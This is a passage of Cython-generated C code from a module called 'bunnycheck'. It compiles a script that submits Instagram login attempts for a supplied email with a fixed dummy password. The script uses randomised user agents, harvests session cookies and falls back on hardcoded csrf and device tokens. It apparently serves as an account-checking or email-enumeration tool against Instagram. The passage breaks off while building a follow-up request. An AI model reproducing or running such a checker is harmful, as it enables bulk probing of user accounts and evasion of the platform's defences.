        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_time); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 457, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 457, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 457, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyUnicode_AsEncodedString(((PyObject*)__pyx_t_8), NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 457, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_8, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 457, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_hexdigest); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 457, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_7 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 457, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_v_csrftoken = __pyx_t_7;
        __pyx_t_7 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 458, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_7 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 458, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_v_ua = __pyx_t_7;
        __pyx_t_7 = 0;

        
        __pyx_t_7 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 459, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_v_headers = ((PyObject*)__pyx_t_7);
        __pyx_t_7 = 0;

        
        __pyx_t_7 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 461, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);

        
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_time); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 462, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_2 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_4 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 462, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 461, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __pyx_t_4 = PyUnicode_Split(((PyObject*)__pyx_t_1), __pyx_kp_u__43, -1L); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 462, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_GetItemInt_List(__pyx_t_4, 0, long, 1, __Pyx_PyInt_From_long, 1, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 462, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __pyx_t_4 = PyNumber_Add(__pyx_kp_u_PWD_INSTAGRAM_BROWSER_0, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 461, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __pyx_t_1 = PyNumber_Add(__pyx_t_4, __pyx_kp_u_maybe_jay_z); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 462, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_enc_password, __pyx_t_1) < 0) __PYX_ERR(0, 461, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_optIntoOneTap, __pyx_n_u_false) < 0) __PYX_ERR(0, 461, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_queryParams, __pyx_kp_u__44) < 0) __PYX_ERR(0, 461, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_trustedDeviceRecords, __pyx_kp_u__44) < 0) __PYX_ERR(0, 461, __pyx_L9_error)

        
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_username, __pyx_v_email) < 0) __PYX_ERR(0, 461, __pyx_L9_error)
        __pyx_v_data = ((PyObject*)__pyx_t_7);
        __pyx_t_7 = 0;

        
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_18);
          /*try:*/ {

            
            __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_requests); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 468, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_post); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 468, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

            
            __pyx_t_7 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 470, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_7);
            if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 470, __pyx_L19_error)

            
            if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 470, __pyx_L19_error)

            
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__45, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 468, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_v_response = __pyx_t_4;
            __pyx_t_4 = 0;

            
          }
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          goto __pyx_L24_try_end;
          __pyx_L19_error:;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

          
          __pyx_t_19 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
          if (__pyx_t_19) {
            __Pyx_AddTraceback("source.bunnycheck", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_7, &__pyx_t_1) < 0) __PYX_ERR(0, 472, __pyx_L21_except_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_7);
            __pyx_v_e = __pyx_t_7;
            /*try:*/ {

              
              __Pyx_XDECREF(__pyx_r);
              __Pyx_INCREF(__pyx_v_e);
              __pyx_r = __pyx_v_e;
              __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
              goto __pyx_L29_return;
            }

            
            /*finally:*/ {
              __pyx_L29_return: {
                __pyx_t_20 = __pyx_r;
                __pyx_r = 0;
                __Pyx_DECREF(__pyx_v_e);
                __pyx_v_e = NULL;
                __pyx_r = __pyx_t_20;
                __pyx_t_20 = 0;
                goto __pyx_L22_except_return;
              }
            }
          }
          goto __pyx_L21_except_error;
          __pyx_L21_except_error:;

          
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_XGIVEREF(__pyx_t_18);
          __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
          goto __pyx_L9_error;
          __pyx_L22_except_return:;
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_XGIVEREF(__pyx_t_18);
          __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
          goto __pyx_L13_try_return;
          __pyx_L24_try_end:;
        }

        
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_18, &__pyx_t_17, &__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_16);
          /*try:*/ {

            
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_md5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 475, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_time); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 475, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_3 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
              __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
              if (likely(__pyx_t_3)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                __Pyx_INCREF(__pyx_t_3);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_8, function);
              }
            }
            __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 475, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 475, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __pyx_t_2 = PyUnicode_AsEncodedString(((PyObject*)__pyx_t_8), NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 475, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
              __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_4);
              if (likely(__pyx_t_8)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_8);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_4, function);
              }
            }
            __pyx_t_7 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_8, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2);
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 475, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_hexdigest); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 475, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_7 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
              __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
              if (likely(__pyx_t_7)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_7);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_4, function);
              }
            }
            __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 475, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_v_csrf = __pyx_t_1;
            __pyx_t_1 = 0;

            
            __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_cookies); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 476, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_1, __pyx_n_u_mid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 476, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_v_mid = __pyx_t_4;
            __pyx_t_4 = 0;

            
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_cookies); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 477, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 477, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__46, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 477, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_v_ig_did = __pyx_t_4;
            __pyx_t_4 = 0;

            
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_cookies); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 478, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 478, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__47, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 478, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_v_ig_nrcb = __pyx_t_4;
            __pyx_t_4 = 0;

            
            __pyx_t_4 = __pyx_pf_6source_10bunnycheck_2genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_1 = __Pyx_Generator_Next(__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 479, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyUnicode_Join(__pyx_kp_u__4, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L32_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_v_app = ((PyObject*)__pyx_t_4);
            __pyx_t_4 = 0;

            
          }
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          goto __pyx_L37_try_end;
          __pyx_L32_error:;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

          
          __pyx_t_19 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
          if (__pyx_t_19) {
            __Pyx_AddTraceback("source.bunnycheck", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_1, &__pyx_t_7) < 0) __PYX_ERR(0, 480, __pyx_L34_except_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_GOTREF(__pyx_t_7);

            
            __Pyx_INCREF(__pyx_kp_u_Xs_pgEDyRPW7J_XbcRxAuG);
            __Pyx_XDECREF_SET(__pyx_v_csrf, __pyx_kp_u_Xs_pgEDyRPW7J_XbcRxAuG);

            
            __Pyx_INCREF(__pyx_kp_u_Z9kT_AALAAFmBDeLH2Lk_XrIJfr3);
            __Pyx_XDECREF_SET(__pyx_v_mid, __pyx_kp_u_Z9kT_AALAAFmBDeLH2Lk_XrIJfr3);

            
            __Pyx_INCREF(__pyx_kp_u_273FE2EC_B117_427D_AA63_55AAA507);
            __Pyx_XDECREF_SET(__pyx_v_ig_did, __pyx_kp_u_273FE2EC_B117_427D_AA63_55AAA507);

            
            __Pyx_INCREF(__pyx_kp_u__4);
            __Pyx_XDECREF_SET(__pyx_v_ig_nrcb, __pyx_kp_u__4);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            goto __pyx_L33_exception_handled;
          }
          goto __pyx_L34_except_error;
          __pyx_L34_except_error:;

          
          __Pyx_XGIVEREF(__pyx_t_18);
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_ExceptionReset(__pyx_t_18, __pyx_t_17, __pyx_t_16);
          goto __pyx_L9_error;
          __pyx_L33_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_18);
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_ExceptionReset(__pyx_t_18, __pyx_t_17, __pyx_t_16);
          __pyx_L37_try_end:;
        }

        
        __pyx_t_7 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 486, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 486, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_2 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 486, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_User_Agent, __pyx_t_1) < 0) __PYX_ERR(0, 486, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 486, __pyx_L9_error)

        
        if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_x_csrftoken, __pyx_v_csrf) < 0) __PYX_ERR(0, 486, __pyx_L9_error)

        
        if (unlikely(!__pyx_v_app)) { __Pyx_RaiseUnboundLocalError("app"); __PYX_ERR(0, 489, __pyx_L9_error) }
        if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_x_ig_app_id, __pyx_v_app) < 0) __PYX_ERR(0, 486, __pyx_L9_error)

        
        __pyx_t_1 = PyTuple_New(9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 490, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_5 = 0;
        __pyx_t_21 = 127;
        __Pyx_INCREF(__pyx_kp_u_csrftoken_3);
        __pyx_t_5 += 10;
        __Pyx_GIVEREF(__pyx_kp_u_csrftoken_3);
        PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_csrftoken_3);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_csrf, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 490, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_mid_3);
        __pyx_t_5 += 6;
        __Pyx_GIVEREF(__pyx_kp_u_mid_3);
        PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_mid_3);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_mid, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 490, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_ig_did_2);
        __pyx_t_5 += 9;
        __Pyx_GIVEREF(__pyx_kp_u_ig_did_2);
        PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u_ig_did_2);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_ig_did, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 490, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
